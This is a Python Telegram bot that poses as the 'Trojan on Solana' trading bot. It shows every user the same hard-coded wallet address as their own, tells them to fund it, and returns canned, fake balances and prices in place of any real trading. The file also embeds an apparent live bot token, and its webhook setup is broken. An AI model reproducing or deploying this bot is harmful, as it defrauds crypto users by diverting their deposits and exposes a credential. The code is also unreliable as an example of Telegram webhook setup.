import logging
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from flask import Flask, request
from telegram import Bot
import requests

# Set up logging to monitor errors and debug information
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# Flask app setup
app = Flask(__name__)

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Settings", callback_data="settings"),
        ],
        [InlineKeyboardButton("Help", callback_data="help")],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    video_path = "WhatsApp Video 2024-12-03 at 12.58.12 AM.mp4"  # Relative path

    try:
        if os.path.exists(video_path):
            with open(video_path, 'rb') as video_file:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption="Welcome to Trojan on Solana! 🎥"
                )
        else:
            logger.error(f"Video file not found at {video_path}")
            await update.message.reply_text("Error: Welcome video not available.")
            return
    except Exception as e:
        logger.error(f"Error sending video: {e}")
        await update.message.reply_text("Error: Could not send video.")

    # Send the welcome text
    welcome_message = (
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Here's your Solana wallet address linked to your Telegram account. "
        "Simply fund your wallet and dive into trading.\n\n"
        "Solana Wallet Address:\n"
        "AVXRzamEeoLD5vUUwdauK8928KPJ9iFuR163SYh28vy1\n\n"
        "TAP TO COPY\n\n"
        "Balance: (0.00) SOL\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!\n\n"
        "Use the following bots for faster trading:\n"
        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Individual functions for each menu button
async def buy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Buy $SLND- (Solend) 📈\n\n"
        "Balance: -_- SOL - W1 ✏️\n\n"
        "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
        "🔴 Insufficient balance for buy amount + gas."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def sell_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Sell $SLND- (Solend) 📉\n\n"
        "Balance: 2.419 SOL\n\n"
        "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
        "Ready to sell? Please confirm the amount."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

# Define similar functions for the other buttons (positions, limit_orders, referrals, etc.)

# Flask route to handle the webhook
@app.route(f'/{os.getenv("TELEGRAM_BOT_TOKEN")}', methods=['POST'])
def webhook():
    json_str = request.get_data().decode("UTF-8")
    update = Update.de_json(json_str, Bot(token=os.getenv("TELEGRAM_BOT_TOKEN")))
    application = Application.builder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    application.update_queue.put(update)
    return 'OK'

# Set the webhook for Telegram bot
def set_webhook():
    url = f"https://new-trade-bot-46-e3ru.onrender.com/{os.getenv('7761108718:AAGwA_irQ3czP3ANsz71tAGBZp3eP5E2XRs')}/setWebhook"
    webhook_url = f"https://new-trade-bot-46-e3ru.onrender.com/{os.getenv('7761108718:AAGwA_irQ3czP3ANsz71tAGBZp3eP5E2XRs')}"  # Replace with your server's URL
    
    response = requests.get(url, params={'url': webhook_url})
    if response.status_code == 200:
        logger.info("Webhook successfully set.")
    else:
        logger.error(f"Failed to set webhook: {response.text}")

# Run the Flask app
if __name__ == "__main__":
    set_webhook()  # Set the webhook when starting the server
    app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 4000)))
